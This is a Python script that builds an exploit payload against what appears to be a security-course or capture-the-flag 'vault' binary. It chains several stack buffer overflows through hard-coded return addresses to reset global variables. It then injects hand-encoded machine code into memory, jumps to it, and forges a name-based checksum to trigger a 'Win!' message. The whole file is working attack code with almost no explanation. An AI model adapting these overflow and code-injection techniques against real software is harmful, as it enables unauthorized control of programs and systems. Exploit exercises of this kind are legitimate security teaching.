import struct

def convert_dw(i):
    """ Convert number in hex to byte array, in little endian. """
    return struct.pack("<I", i)

def inject_code(i):
    """ Inject code """
    return struct.pack(">I", i)


# initialize payload and variables
payload     = ""
newESP      = 0xbffffc2c  # this should be changed only for every machine
offset      = 0xffffcd54 - newESP + 0x1
offset2     = -0x19        # this should be changed only for every machine
oldEBP      = 0xffffcd80
shellcode   = 0xffffc93c
oldData1    = 0xffffcd88
oldData2    = 0x08048a18
mainAddr    = 0x0804893A
nameString  = "Smadu Alexandru "
address     = 0xb7fd4000  # this should be changed only for every machine


# compute product
prodValue   = (address << 16) & 0xFFFFFFFF
prodValue   = prodValue ^ address
prodValue   *= 0x45D9F3A
prodValue   &= 0xFFFFFFFF
prodValue   = prodValue ^ 0xaaaaaaaa        # encrypt prodValue


# exploit buffer-overflow vulnerability
# set global variables to 0
payload += "3\n"
payload += "a" * 4
payload += convert_dw(oldEBP - offset)	    # old ebp
payload += convert_dw(0x08048895)	        # GlobalVar1 = 0
payload += convert_dw(mainAddr)	            # return point | exit
payload += convert_dw(oldData1)	            # old data
payload += convert_dw(oldData2)	            # old data

payload += "\n3\n"					        # next
payload += "a" * 4
payload += convert_dw(oldEBP - offset) 	    # old ebp
payload += convert_dw(0x080488BA) 	        # GlobalVar2 = 0
payload += convert_dw(mainAddr) 	        # return point | exit
payload += convert_dw(0xDEADC0DE) 	        # arg1
payload += convert_dw(oldData1) 	            # old data

payload += "\n3\n"					        # next
payload += "a" * 4
payload += convert_dw(oldEBP - offset) 	    # old ebp
payload += convert_dw(0x080488EA) 	        # GlobalVar3 = 0
payload += convert_dw(mainAddr) 	        # return point | exit
payload += convert_dw(0x78F26913) 	        # arg1
payload += convert_dw(0x65BB55DC) 	        # arg2


payload += "\n3\n"					        # next
payload += "a" * 4
payload += convert_dw(oldEBP - offset) 	    # old ebp
payload += convert_dw(0x0804874E) 	        # read buffer
payload += convert_dw(mainAddr) 	        # return point | exit
payload += convert_dw(mainAddr) 	        # some data
payload += convert_dw(0x65BB55DC) 	        # some data

# compute product
code1 = 0x0408a200
code2 = 0x0000c705
code3 = 0x00128422

AA = prodValue & 0x000000FF
code1 += AA

BB = prodValue & 0x0000FF00
code2 += BB << 16

CC = prodValue & 0x00FF0000
code2 += CC

DD = prodValue & 0xFF000000
code3 += DD

# inject code - change this for every machine
payload += "b"                              # some padding
payload += inject_code(0xc70528a3)
payload += inject_code(0x0408ff23)
payload += inject_code(0x4f6dc705)
payload += inject_code(0x2ca30408)
payload += inject_code(0xaf8e09ae)
payload += inject_code(0xc70530a3)
payload += inject_code(code1)  #----
payload += inject_code(code2)  #----
payload += inject_code(0x34a30408)
payload += inject_code(code3)  #----
payload += inject_code(0xc70538a3)
payload += inject_code(0x0408aea2)
payload += inject_code(0x557ac705)
payload += inject_code(0x3ca30408)
payload += inject_code(0x63693a3a)
payload += inject_code(0xb83a8904)
payload += inject_code(0x08ffe090)

payload += "b" * 951                        # fullfit the buffer
payload += convert_dw(0x0)                  # add \0 to final

# execute the inserted code
payload += "\n3\n"					        # next
payload += "a" * 4
payload += convert_dw(oldEBP - offset) 	    # old ebp
payload += convert_dw(shellcode - offset - offset2) 	# execute form RAM
payload += convert_dw(mainAddr) 	        # return point | exit
payload += convert_dw(mainAddr) 	        # some data
payload += convert_dw(0x65BB55DC) 	        # some data


# set mmap allocated memory with the right code
payload += "3\n"
payload += "a" * 4
payload += convert_dw(oldEBP - offset)	    # old ebp
payload += convert_dw(0x08048895)	        # GlobalVar1 = 0
payload += convert_dw(mainAddr)	            # return point | exit
payload += convert_dw(oldData1)	            # old data
payload += convert_dw(oldData2)	            # old data

payload += "\n3\n"					        # next
payload += "a" * 4
payload += convert_dw(oldEBP - offset) 	    # old ebp
payload += convert_dw(0x080488BA)           # GlobalVar2 = 0
payload += convert_dw(mainAddr)             # return point | exit
payload += convert_dw(0xDEADC0DE)           # arg1
payload += convert_dw(oldData1 - offset) 	# old data

payload += "\n3\n"					        # next
payload += "a" * 4
payload += convert_dw(oldEBP - offset) 	    # old ebp
payload += convert_dw(0x080488EA) 	        # GlobalVar3 = 0
payload += convert_dw(mainAddr) 	        # return point | exit
payload += convert_dw(0x78F26913) 	        # arg1
payload += convert_dw(0x65BB55DC) 	        # arg2

# set return to main address
payload += "\n3\n"					        # next
payload += "a" * 4
payload += convert_dw(oldEBP - offset) 	    # old ebp
payload += convert_dw(0x080488EA) 	        # GlobalVar3 = 0
payload += convert_dw(mainAddr) 	        # return point | exit
payload += convert_dw(mainAddr) 	        # arg1
payload += convert_dw(0xaaaaaaaa) 	        # arg2

# execute 4th option and print "Win!" message
payload += "\n4\n"
string = nameString					        # add 'Smadu Alexandru'
sumOfNameString = sum(bytearray(nameString))
sumOfZ = (74565 - sumOfNameString) 	        # 0x12345 = 74565
string += 'Z' * (sumOfZ / sum(bytearray('Z')))
string += chr(74565 - sum(bytearray(string)))
numOfZeros = 1024 - len(string)
string += chr(0) * numOfZeros
payload += string

# exit from vault
payload += "\n5\n"					        # exit

with open('payload', 'wb') as f:
    f.write(payload)
